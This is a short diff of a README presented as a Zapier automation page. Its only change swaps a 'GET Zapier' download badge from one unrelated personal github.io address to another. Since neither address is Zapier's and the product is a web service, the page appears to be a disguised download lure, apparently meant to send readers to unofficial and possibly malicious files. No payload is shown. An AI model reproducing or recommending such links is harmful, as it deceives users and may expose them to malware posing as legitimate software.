@@ -1,6 +1,6 @@
 # Zapier Automation - App Automation and Workflow Platform
 
-[![GET Zapier](https://img.shields.io/badge/GET%20%E2%80%94%20Zapier-0078D6?style=for-the-badge&logoColor=white)](https://kingsleytuckerugpv.github.io/.github/zapier-automation)
+[![GET Zapier](https://img.shields.io/badge/GET%20%E2%80%94%20Zapier-0078D6?style=for-the-badge&logoColor=white)](https://zaydenyatesemlt.github.io/.github/zapier-automation)
 
 ## What Zapier Brings to Automated Work
 
